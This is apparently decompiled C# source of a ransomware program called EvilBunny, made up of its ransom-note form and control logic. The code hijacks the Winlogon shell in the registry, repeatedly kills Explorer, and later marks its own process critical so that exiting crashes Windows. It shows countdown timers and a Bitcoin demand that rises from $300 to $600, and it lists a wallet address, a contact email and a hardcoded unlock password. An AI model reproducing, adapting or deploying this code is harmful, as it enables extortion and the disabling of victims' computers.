using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using EvilBunny_RANSOMWARE.Properties;
using Microsoft.Win32;

namespace EvilBunny_RANSOMWARE;

public class Form1 : Form
{
	private IContainer components = null;

	private PictureBox pictureBox1;

	private TextBox textBox1;

	private TextBox textBox2;

	private Label label1;

	private TextBox textBox3;

	private Label label2;

	private Label label3;

	private TextBox textBox4;

	private TextBox textBox5;

	private Button button1;

	private TextBox textBox6;

	private Button button2;

	private TextBox textBox7;

	private Timer desktop_kill;

	private Timer tmr_out;

	private Timer explorer_kill;

	private Button button3;

	private TextBox textBox8;

	private Timer payment_raise;

	[DllImport("user32.dll")]
	private static extern bool BlockInput(bool block);

	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

	public Form1()
	{
		InitializeComponent();
		((Control)label1).set_Text(TimeSpan.FromMinutes(300.0).ToString());
		((Control)label3).set_Text(TimeSpan.FromMinutes(600.0).ToString());
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		//IL_005f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_0070: Expected O, but got Unknown
		//IL_008f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a1: Expected O, but got Unknown
		Encryption.Start();
		RegistryKey registryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
		registryKey.SetValue("Shell", "empty", RegistryValueKind.String);
		desktop_kill.Start();
		explorer_kill.Start();
		tmr_out.Start();
		DateTime startTime = DateTime.Now;
		Timer val = new Timer();
		val.set_Interval(1000);
		Timer val2 = val;
		val2.add_Tick((EventHandler)delegate
		{
			((Control)label1).set_Text((TimeSpan.FromMinutes(300.0) - (DateTime.Now - startTime)).ToString("hh\\:mm\\:ss"));
		});
		val2.set_Enabled(true);
		_ = DateTime.Now;
		Timer val3 = new Timer();
		val3.set_Interval(1000);
		Timer val4 = val3;
		val4.add_Tick((EventHandler)delegate
		{
			((Control)label3).set_Text((TimeSpan.FromMinutes(600.0) - (DateTime.Now - startTime)).ToString("hh\\:mm\\:ss"));
		});
		val4.set_Enabled(true);
	}

	private void button3_Click(object sender, EventArgs e)
	{
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_0056: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f1: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)textBox8).get_Text() == "")
		{
			MessageBox.Show("Incorrect.", "ERROR", (MessageBoxButtons)4, (MessageBoxIcon)16);
		}
		else if (((Control)textBox8).get_Text() == "az900io@")
		{
			MessageBox.Show("Correct.", "Decrypting", (MessageBoxButtons)1, (MessageBoxIcon)16);
			Encryption.Start();
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey.SetValue("DisableTaskMgr", "", RegistryValueKind.String);
			RegistryKey registryKey2 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
			registryKey2.SetValue("Shell", "explorer.exe", RegistryValueKind.String);
			Process.Start("C:\\Windows\\explorer.exe");
			Process[] array = null;
			array = Process.GetProcessesByName("EvilBunny_RANSOMWARE");
			Process[] array2 = array;
			foreach (Process process in array2)
			{
				process.Kill();
			}
		}
		else
		{
			MessageBox.Show("Incorrect.", "ERROR", (MessageBoxButtons)4, (MessageBoxIcon)16);
		}
	}

	private void desktop_kill_Tick(object sender, EventArgs e)
	{
		desktop_kill.Stop();
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string path = folderPath + "\\desktop.ini";
		string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
		string text = Path.Combine(environmentVariable, "Downloads");
		string path2 = text + "\\desktop.ini";
		if (File.Exists(path))
		{
			File.Delete(path);
		}
		if (File.Exists(path2))
		{
			File.Delete(path2);
		}
		desktop_kill.Start();
	}

	private void explorer_kill_Tick(object sender, EventArgs e)
	{
		explorer_kill.Stop();
		Process[] array = null;
		array = Process.GetProcessesByName("explorer");
		Process[] array2 = array;
		foreach (Process process in array2)
		{
			process.Kill();
		}
		((Form)this).CenterToScreen();
		Thawouse();
	}

	public static void FreezeMouse()
	{
		BlockInput(block: true);
	}

	public static void Thawouse()
	{
		BlockInput(block: false);
	}

	private void tmr_out_Tick(object sender, EventArgs e)
	{
		tmr_out.Stop();
		int processInformation = 1;
		Process.EnterDebugMode();
		NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref processInformation, 4);
		Environment.Exit(-1);
		Process.Start("shutdown /r /t 0");
	}

	private void payment_raise_Tick(object sender, EventArgs e)
	{
		payment_raise.Stop();
		((Control)textBox4).set_Text("Send $600 worth of BTC");
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Expected O, but got Unknown
		//IL_00b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bb: Expected O, but got Unknown
		//IL_00c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cc: Expected O, but got Unknown
		//IL_00d3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00dd: Expected O, but got Unknown
		//IL_00de: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e8: Expected O, but got Unknown
		//IL_00e9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f3: Expected O, but got Unknown
		//IL_00fa: Unknown result type (might be due to invalid IL or missing references)
		//IL_0104: Expected O, but got Unknown
		//IL_0142: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_01bb: Expected O, but got Unknown
		//IL_01eb: Unknown result type (might be due to invalid IL or missing references)
		//IL_025b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0265: Expected O, but got Unknown
		//IL_0296: Unknown result type (might be due to invalid IL or missing references)
		//IL_0302: Unknown result type (might be due to invalid IL or missing references)
		//IL_030c: Expected O, but got Unknown
		//IL_0340: Unknown result type (might be due to invalid IL or missing references)
		//IL_03b0: Unknown result type (might be due to invalid IL or missing references)
		//IL_03ba: Expected O, but got Unknown
		//IL_03ee: Unknown result type (might be due to invalid IL or missing references)
		//IL_046b: Unknown result type (might be due to invalid IL or missing references)
		//IL_04d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_04de: Expected O, but got Unknown
		//IL_0512: Unknown result type (might be due to invalid IL or missing references)
		//IL_0582: Unknown result type (might be due to invalid IL or missing references)
		//IL_058c: Expected O, but got Unknown
		//IL_05cb: Unknown result type (might be due to invalid IL or missing references)
		//IL_065c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b46: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b50: Expected O, but got Unknown
		//IL_0b55: Unknown result type (might be due to invalid IL or missing references)
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		pictureBox1 = new PictureBox();
		textBox1 = new TextBox();
		textBox2 = new TextBox();
		label1 = new Label();
		textBox3 = new TextBox();
		label2 = new Label();
		label3 = new Label();
		textBox4 = new TextBox();
		textBox5 = new TextBox();
		button1 = new Button();
		textBox6 = new TextBox();
		button2 = new Button();
		textBox7 = new TextBox();
		desktop_kill = new Timer(components);
		tmr_out = new Timer(components);
		explorer_kill = new Timer(components);
		button3 = new Button();
		textBox8 = new TextBox();
		payment_raise = new Timer(components);
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		pictureBox1.set_Image((Image)(object)Resources.ParRab);
		((Control)pictureBox1).set_Location(new Point(10, 4));
		((Control)pictureBox1).set_Margin(new Padding(5, 4, 5, 4));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(312, 665));
		pictureBox1.set_TabIndex(0);
		pictureBox1.set_TabStop(false);
		((Control)textBox1).set_BackColor(Color.Black);
		((Control)textBox1).set_Font(new Font("Arial", 16f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)textBox1).set_ForeColor(Color.Red);
		((Control)textBox1).set_Location(new Point(356, 4));
		((Control)textBox1).set_Margin(new Padding(5, 4, 5, 4));
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(588, 44));
		((Control)textBox1).set_TabIndex(1);
		((Control)textBox1).set_Text("Your files are encrypted by EvilBunny!");
		((Control)textBox2).set_BackColor(Color.Black);
		((Control)textBox2).set_Font(new Font("Arial", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)textBox2).set_ForeColor(Color.Yellow);
		((Control)textBox2).set_Location(new Point(330, 76));
		((Control)textBox2).set_Margin(new Padding(5, 4, 5, 4));
		((Control)textBox2).set_Name("textBox2");
		((Control)textBox2).set_Size(new Size(326, 35));
		((Control)textBox2).set_TabIndex(2);
		((Control)textBox2).set_Text("Payment will be raised on:");
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Arial", 24f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_ForeColor(Color.White);
		((Control)label1).set_Location(new Point(346, 130));
		((Control)label1).set_Margin(new Padding(5, 0, 5, 0));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(220, 56));
		((Control)label1).set_TabIndex(3);
		((Control)label1).set_Text("00:00:00");
		((Control)textBox3).set_BackColor(Color.Black);
		((Control)textBox3).set_Font(new Font("Arial", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)textBox3).set_ForeColor(Color.Yellow);
		((Control)textBox3).set_Location(new Point(345, 208));
		((Control)textBox3).set_Margin(new Padding(5, 4, 5, 4));
		((Control)textBox3).set_Name("textBox3");
		((Control)textBox3).set_Size(new Size(247, 35));
		((Control)textBox3).set_TabIndex(4);
		((Control)textBox3).set_Text("Your will be lost on:");
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Location(new Point(613, 463));
		((Control)label2).set_Margin(new Padding(5, 0, 5, 0));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(81, 29));
		((Control)label2).set_TabIndex(5);
		((Control)label2).set_Text("label2");
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Font(new Font("Arial", 24f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label3).set_ForeColor(Color.White);
		((Control)label3).set_Location(new Point(346, 259));
		((Control)label3).set_Margin(new Padding(5, 0, 5, 0));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(220, 56));
		((Control)label3).set_TabIndex(6);
		((Control)label3).set_Text("00:00:00");
		((Control)textBox4).set_BackColor(Color.Black);
		((Control)textBox4).set_Font(new Font("Arial", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)textBox4).set_ForeColor(Color.FromArgb(255, 128, 0));
		((Control)textBox4).set_Location(new Point(330, 457));
		((Control)textBox4).set_Margin(new Padding(5, 4, 5, 4));
		((Control)textBox4).set_Name("textBox4");
		((Control)textBox4).set_Size(new Size(326, 35));
		((Control)textBox4).set_TabIndex(7);
		((Control)textBox4).set_Text("Send $300 worth of BTC");
		((Control)textBox5).set_BackColor(Color.Black);
		((Control)textBox5).set_ForeColor(Color.Lime);
		((Control)textBox5).set_Location(new Point(321, 513));
		((Control)textBox5).set_Margin(new Padding(5, 4, 5, 4));
		((Control)textBox5).set_Name("textBox5");
		((Control)textBox5).set_Size(new Size(507, 35));
		((Control)textBox5).set_TabIndex(8);
		((Control)textBox5).set_Text("1HNkDUPxEhnN8Q2ZicSnmrifDJYUpAFdbG");
		((Control)button1).set_Location(new Point(847, 510));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(140, 40));
		((Control)button1).set_TabIndex(9);
		((Control)button1).set_Text("Copy");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)textBox6).set_BackColor(Color.Black);
		((Control)textBox6).set_ForeColor(Color.Lime);
		((Control)textBox6).set_Location(new Point(330, 571));
		((Control)textBox6).set_Name("textBox6");
		((Control)textBox6).set_Size(new Size(408, 35));
		((Control)textBox6).set_TabIndex(10);
		((Control)textBox6).set_Text("E-mail danielnusradin@gmail.com");
		((Control)button2).set_Location(new Point(744, 571));
		((Control)button2).set_Name("button2");
		((Control)button2).set_Size(new Size(139, 36));
		((Control)button2).set_TabIndex(11);
		((Control)button2).set_Text("Copy");
		((ButtonBase)button2).set_UseVisualStyleBackColor(true);
		((Control)textBox7).set_BackColor(Color.Black);
		((Control)textBox7).set_ForeColor(Color.Red);
		((Control)textBox7).set_Location(new Point(664, 76));
		((TextBoxBase)textBox7).set_Multiline(true);
		((Control)textBox7).set_Name("textBox7");
		((Control)textBox7).set_Size(new Size(496, 404));
		((Control)textBox7).set_TabIndex(12);
		((Control)textBox7).set_Text(componentResourceManager.GetString("textBox7.Text"));
		desktop_kill.set_Interval(1000);
		desktop_kill.add_Tick((EventHandler)desktop_kill_Tick);
		tmr_out.set_Interval(36000000);
		tmr_out.add_Tick((EventHandler)tmr_out_Tick);
		explorer_kill.set_Interval(2000);
		explorer_kill.add_Tick((EventHandler)explorer_kill_Tick);
		((Control)button3).set_Location(new Point(351, 395));
		((Control)button3).set_Name("button3");
		((Control)button3).set_Size(new Size(241, 38));
		((Control)button3).set_TabIndex(13);
		((Control)button3).set_Text("DECRYPT");
		((ButtonBase)button3).set_UseVisualStyleBackColor(true);
		((Control)button3).add_Click((EventHandler)button3_Click);
		((Control)textBox8).set_Location(new Point(351, 348));
		((Control)textBox8).set_Name("textBox8");
		((Control)textBox8).set_Size(new Size(241, 35));
		((Control)textBox8).set_TabIndex(14);
		payment_raise.set_Interval(18000000);
		payment_raise.add_Tick((EventHandler)payment_raise_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(15f, 29f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.Black);
		((Form)this).set_ClientSize(new Size(1172, 666));
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)textBox8);
		((Control)this).get_Controls().Add((Control)(object)button3);
		((Control)this).get_Controls().Add((Control)(object)textBox7);
		((Control)this).get_Controls().Add((Control)(object)button2);
		((Control)this).get_Controls().Add((Control)(object)textBox6);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)textBox5);
		((Control)this).get_Controls().Add((Control)(object)textBox4);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)textBox3);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)textBox2);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)pictureBox1);
		((Control)this).set_Font(new Font("Arial", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Form)this).set_Margin(new Padding(5, 4, 5, 4));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("EvilBunny_Decrypt0r");
		((Form)this).set_TopMost(true);
		((Form)this).add_Load((EventHandler)Form1_Load);
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
